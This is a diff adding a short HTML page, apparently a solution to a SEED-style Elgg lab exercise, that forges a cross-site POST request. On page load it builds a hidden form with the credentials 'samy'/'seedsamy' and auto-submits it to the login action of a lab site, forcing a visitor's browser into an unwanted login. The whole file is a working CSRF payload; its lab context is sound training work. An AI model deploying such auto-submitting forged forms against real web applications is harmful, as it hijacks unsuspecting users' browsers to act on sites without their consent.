@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<title>CSRF-POST</title>
+</head>
+
+<body>
+	<h1>This page forges an HTTP POST request -- Xubiang.</h1>
+	<script type="text/javascript">
+		function forge_post() {
+			var fields;
+
+			fields = "<input type='hidden' name='username' value='samy' />";
+			fields += "<input type='hidden' name='password' value='seedsamy' />";
+
+			var p = document.createElement("form");
+			p.method = "post";
+			p.action = "http://www.csrflabelgg.com/action/login";
+			p.innerHTML = fields;
+			document.body.appendChild(p);
+			p.submit();
+		}
+		window.onload = function () { forge_post(); }
+	</script>
+</body>
